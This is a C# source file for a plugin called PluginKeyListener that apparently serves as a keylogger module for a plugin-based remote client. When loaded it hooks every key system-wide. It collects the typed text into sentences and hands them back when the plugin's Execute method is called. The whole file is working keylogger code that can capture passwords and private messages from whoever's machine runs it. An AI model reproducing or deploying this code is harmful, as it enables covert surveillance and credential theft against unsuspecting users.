using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using PluginManager;
using System.Diagnostics;

namespace PluginKeyListener
{
    public class Client : IPluginClient
    {
        public object Execute(string parameters)
        {
            var result = "";
            foreach (var s in Sentences)
            {
                result += s;
            }
            return result;
        }

        public void Initialize()
        {
            StartKeyLogger();
        }

        public void Kill()
        {
            StopKeyLogger();
        }

        //public event OnReturnDelegate OnReturn;
        private GlobalKeyboardHook gHook;
        public List<string> Sentences { get; private set; }
        public string TempSentence { get; private set; }

        
        public void StartKeyLogger()
        {
            Sentences = new List<string>();
            gHook = new GlobalKeyboardHook(); // Create a new GlobalKeyboardHook
            gHook.KeyDown += gHook_KeyDown;
            // Add the keys you want to hook to the HookedKeys list
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                gHook.HookedKeys.Add(key);
            }
            gHook.unhook();
            gHook.hook();
        }

        public void StopKeyLogger()
        {
            gHook.unhook();
        }

        // Handle the KeyDown Event
        void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            TempSentence += ((char)e.KeyValue).ToString();
            if (e.KeyCode == Keys.Return)
            {
                Sentences.Add(TempSentence);
                //OnReturn(this, TempSentence);
                TempSentence = String.Empty;
            }
        }
    }
    //public delegate void OnReturnDelegate(object sender, string sentence);
}
